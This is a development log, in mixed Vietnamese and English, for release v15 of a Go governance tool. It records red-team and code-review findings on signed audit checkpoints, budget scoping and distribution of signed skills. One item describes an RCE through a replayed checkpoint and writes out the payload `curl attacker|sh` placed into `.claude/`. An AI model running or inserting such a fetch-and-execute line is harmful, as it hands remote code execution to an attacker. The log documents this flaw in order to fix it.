# v15 — Central-mode parity (260710)

Branch: main. Commit: 920f096. Plan: `260709-0845-dandori-v15-central-mode-parity`.

## Đóng gap "central-mode not at parity with local" lặp lại qua v12/v13/v14

Hành động: **6 phase** — audit anchor (Ed25519 co-sign + signed git checkpoint) → central audit for ingests → risk-score central (per-operator snapshots) → budget central (ask-only, not model-downgrade) → distribution (byte-hash gate + per-unit approval sig) → fleet compliance export.

Mục tiêu: GOVERNANCE PARITY (audit + G5/G3 works centrally, not advisory-only) + DISTRIBUTION PARITY (skill/kit pull over network, signed, re-verified).

## Red-team khoe ra: ORIGINAL PLAN KHÔNG IMPLEMENT ĐƯỢC — kiến trúc sai, không phải bug

Brainstorm → plan 6 phase → **red-team adversarial (3 CRITICAL + 5 HIGH + 8 MEDIUM + 9 LOW)** — tất cả processed pre-cook. Ba CRITICAL:

1. **Ed25519 co-sign là rạp kịch trên single box**: key sống cạnh DB. Nếu insider có key, co-sign không chặn được. Co-sign chỉ defend MITM / party không có key. Giải: signed external checkpoint (git-committed, off-box) = trust root thực. Checkpoint mang first_signed_id (tặng checkpoint địa chỉ trong chuỗi), in vào signature để replay checkpoint cũ không được phép. Per-row canonical hashing (length-prefix) để chặn tail-truncation + delimiter-shift reattribution.

2. **Central guardrail là vốn advisory**: verdict chạy client-side trên client-writable cache. Co-sign lịch sử bị client giả mạo chỉ làm sử dụng giả tin tưởng hơn (co-signing thêm tin) — design khiến nó sai cách.

3. **Budget downgrade-parity không thể**: central active run có NULL model — chỉ set tại finalize. Central không thể biết dùng model nào để downgrade budget. Rescope: Ask (trao quyền quyết định cho operator), không downgrade. Per-scope (agent/project).

Plan được **viết lại toàn bộ** (không patch) với user's decisions khóa trước khi code.

## Code-review + verify + PoC: lỗi triển khai mà test suite che giấu qua phantom coverage

**Bốn cú bắt thật** (không hình thức):

1. **C1 — Checkpoint viết nhưng KHÔNG bao giờ verify**: `handleSigningEnable` ghi checkpoint vào git, nhưng code pull từ server không verify signature nó trước dùng. Nó trở thành decorative. Exploit: strip-all-signatures + delete-marker pass khi checkpoint không tồn tại. Fix: verify checkpoint sig + embed first_signed_id vào checkpoint sig + write first checkpoint immediately (không defer). Code-review + E2E thi đua bắt.

2. **C2 — RCE qua phantom anchor**: byte-hash gate đúng, **nhưng checkpoint chỉ ký (TipID, TipHash), không ràng buộc approve_hash**. Approve_id là server cung cấp + không verify. Exploit: attacker replay genuine signed checkpoint + nói dối approve_id → RCE (viết `curl attacker|sh` vào `.claude/`). PoC chạy được, proof-of-concept **test của implementer chỉ đổi body, giữ approve_hash — quá yếu để bắt**. Fix: per-unit Ed25519 sig over (unit_id, approve_hash) — đúng hash byte-gate check; checkpoint off critical path. Code-review thi đua bắt với PoC.

3. **C3 — Action=Kind phantom-coverage**: coverage query join `audit_log.action = events.kind`, nhưng engine.record() collapse all local denies thành `events.kind="guardrail_block"`, còn audit giữ granular action (kill/secrets/budget/gate). Falsely flag every audited decision. **Test chỉ dùng guardrail_block** (where kind==action), không expose. Fix: key on run-level audit presence. Proved non-vacuous: revert query, test mới fail on 5 cases chính xác. Code-review bắt + pair-write test.

4. **C4 — Pubkey fingerprint shipping là circular trust**: bundle chứa pubkey audit party tạo — không track nó out-of-band. Fix: pin pubkey fingerprint outside-the-bundle (config, không ở chứng chỉ).

Cả bốn: "all green" là START review, không phải END — crypto/audit/RCE work.

## Concurrent review + honest threat model + seam discipline

- **P1/P2 parallel**: signature machinery (seq ordering, first_id, length-prefix chain hash) vs ingest tx (AppendTx inside batch, anti-deadlock on 1-conn pool).
- **P3 → P4 → P5 tuần tự** (risk cần audit rows P4 tạo; budget read-pool + cache, rescope từ model-downgrade).
- **P6 (distribution + compliance)**: RCE anchor fix + phantom-action coverage join rewrite.
- **Honest threat model xuyên suốt**: on-box co-sign không chặn insider holding key; spool replay (chain-order ≠ time-order); central = client-attested from server-receipt onward. Documented, không overclaim.

## Test pollution + secret-scanning friction

- Checkpoint feature auto-git-commit từ repo CWD firing during test → 2 stray checkpoint JSON + 26 junk commits. `git rm`, gitignore'd, squash-merged để main history sạch.
- GitHub secret-scanning push-protection blocked synthetic AKIA... test fixture. Switched to AWS documentation example key (scanner-allowlist, vẫn match guardrail regex).

## Verify

`CGO_ENABLED=0 go build ./...` sạch. `go vet ./...` sạch. `go test ./... -race` xanh toàn repo (18 package; race flag bắt tx-contention). `GOOS=linux CGO_ENABLED=0 go build ./cmd/dandori` cross-compile thành công.

RCE + 2 phantom-coverage fixes mỗi cái proven by non-vacuous test (revert → watch fail on exact case).

## Settled deviations

- **Audit chain integrity** — signed checkpoint = trust root; co-sign = MITM defense, không insider defense.
- **Budget Ask not downgrade** — central chưa biết model lúc active, rescope thành explicit.
- **Risk-score per-operator, không global** — chặn fleet run-ID/score leak.
- **Guardrail flag-only, không enforce** — tái xác nhận advisory nature.
- **G5 tool-volume central only** — parity scope, không mở rộng G1-G4 thành per-tool.

## Deferred / [Sau]

- Risk-score tinh chỉnh (hiện snapshot per-op, không trend).
- Budget rescope tới per-run granule (hiện per-scope only).
- Compliance export thêm audit-quality signal (hiện decision-event presence only).
- Multi-box deployment (hiện doc only: single-box co-sign, spool via rsync/git-pull).

## Bug production tìm-và-vá trong phase này

1. Checkpoint written-not-verified → decide signed external checkpoint, re-implement verification chain.
2. RCE via phantom anchor (approve_hash) → prove with PoC, add per-unit signature.
3. Action=Kind phantom-coverage (join logic false-positive) → rewrite query by run-level audit presence + prove with targeted test.

Tất cả ba xoay quanh **test phantoms** (tất cả test đi qua đúng một seam chuẩn hóa) — cùng bài học v12/v13: seam discipline.

**Status:** DONE
**Summary:** v15 khép gap "central-mode not parity" qua 6 phase: audit anchor (signed checkpoint + per-row canonical hashing) → central audit (atomic co-sign via AppendTx) → risk per-operator → budget Ask → distribution (per-unit approval sig + RCE fix) → compliance export (decision-event presence). Red-team proved ORIGINAL PLAN WAS ARCHITECTURALLY BROKEN (3 CRITICAL: co-sign theater, guardrail advisory-only, budget downgrade impossible) — plan rewritten pre-cook. Code-review + PoC caught 4 implementation gaps hidden by phantom-coverage: checkpoint written-not-verified, RCE via approve_hash, action=kind join false-positive, pubkey circular-trust. Crypto/audit/RCE work demanded two gates (plan vs code); all green is start-of-review, not end. Build/vet/test/cross-compile xanh.
**Concerns:** Threat model documented: on-box co-sign doesn't defend insider with key; spool replay; central client-attested from server-receipt onward. Multi-box deployment deferred (single-box scope, sync via rsync/git-pull noted). Budget Ask vs per-run granule, risk trend, compliance signals [Sau].
